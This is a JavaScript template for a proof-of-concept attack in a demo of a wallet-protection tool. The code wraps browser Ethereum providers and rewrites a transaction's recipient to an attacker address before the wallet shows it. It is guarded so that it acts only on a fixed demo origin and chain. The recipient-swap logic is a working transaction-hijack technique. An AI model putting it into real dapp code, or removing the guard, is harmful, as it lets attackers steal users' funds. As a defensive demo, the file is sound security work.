// Template for the demo attack payload. demo/tools/make-attacks.mjs bakes the values from
// demo/config.json (attacker address, chain id, origin) into the ALL-CAPS placeholders below
// to produce attacker/evil.js. There is no runtime fetch: the guard values are fixed here, at
// generation time.
//
// This is a proof-of-concept of the exact attack Unforged is built to block — tampered dapp
// code that rewrites a transaction's recipient before the wallet ever shows it. It is
// deliberately INERT everywhere but the demo: it rewrites `to` only when BOTH the page origin
// and the wallet's chain match the baked-in demo values. On any real site or network every
// call passes through untouched. In the demo we always REJECT the transaction in the wallet.
(function () {
  "use strict";
  var ATTACKER = "__ATTACKER__";
  var CHAIN_ID = __CHAIN_ID__;
  var ORIGIN = "__ORIGIN__";
  var WRAPPED = Symbol.for("unforged.demo.wrapped");

  // Half of the guard. The other half (the chain) is checked per transaction, below.
  function onDemoOrigin() {
    try {
      return window.location.origin === ORIGIN;
    } catch (e) {
      return false;
    }
  }

  // Wrap one provider's `request` exactly once; a symbol marks providers we have seen.
  function wrap(provider) {
    if (!provider || typeof provider.request !== "function" || provider[WRAPPED]) {
      return provider;
    }
    var forward = provider.request.bind(provider);
    provider.request = function (args) {
      if (!args || args.method !== "eth_sendTransaction" || !onDemoOrigin()) {
        return forward(args);
      }
      // On the demo origin, ask this same provider which chain it is on before deciding.
      return Promise.resolve(forward({ method: "eth_chainId" })).then(
        function (chainIdHex) {
          if (Number(chainIdHex) === CHAIN_ID) {
            var params = args.params;
            if (Array.isArray(params) && params[0] && typeof params[0] === "object") {
              var original = params[0].to;
              params[0].to = ATTACKER;
              console.log("[unforged demo payload] to " + original + " -> " + ATTACKER);
            }
          }
          return forward(args);
        },
        function () {
          // Could not read the chain: stay inert and forward untouched.
          return forward(args);
        }
      );
    };
    try {
      provider[WRAPPED] = true;
    } catch (e) {
      // A frozen provider still gets the wrapped request; the mark is best-effort.
    }
    return provider;
  }

  if (typeof window !== "undefined") {
    if (window.ethereum) wrap(window.ethereum);
    // EIP-6963: wrap every provider that announces itself, then ask them all to announce.
    window.addEventListener("eip6963:announceProvider", function (event) {
      if (event && event.detail) wrap(event.detail.provider);
    });
    try {
      window.dispatchEvent(new Event("eip6963:requestProvider"));
    } catch (e) {
      // No Event constructor (non-browser host): nothing to request.
    }
  }
})();
